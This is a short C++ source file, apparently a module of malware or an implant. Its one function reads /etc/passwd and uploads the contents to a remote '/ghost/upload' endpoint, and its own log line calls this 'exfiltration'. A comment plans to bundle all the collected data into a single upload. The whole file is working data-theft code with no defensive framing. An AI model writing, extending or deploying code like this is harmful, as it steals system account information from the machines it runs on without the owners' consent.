#include "modules/gathering/EtcPasswd.hpp"
#include "utils/SystemUtils.hpp"
#include "utils/Logger.hpp"
#include "network/Comms.hpp"

bool EtcPasswdMethod::trigger() {
    std::string data;

    LOG_INFO("Attempting /etc/passwd exfiltration")
    data += FileUtils::ReadFile("/etc/passwd");

    if (data.empty()) return false;

    // TODO: think about aggregating all info and sending in one request, this is highly inefficient
    LOG_INFO("Uploading /etc/passwd")
    return Comms::UploadFile("/api/v1/ghost/upload", "etc_passwd.txt", data);
}
